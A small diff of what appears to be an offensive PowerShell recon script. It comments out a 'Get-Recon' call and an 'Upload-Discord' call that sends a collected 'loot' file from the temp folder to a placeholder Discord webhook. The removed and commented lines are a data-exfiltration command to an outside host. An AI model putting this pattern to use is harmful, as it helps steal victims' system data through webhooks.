@@ -80,6 +80,6 @@ function Upload-Discord {
     }
 }
 
-Get-Recon
+#Get-Recon
 
-Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file "$env:TEMP\CaliLoot.txt" | Out-Null
+#Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file "$env:TEMP\CaliLoot.txt" | Out-Null
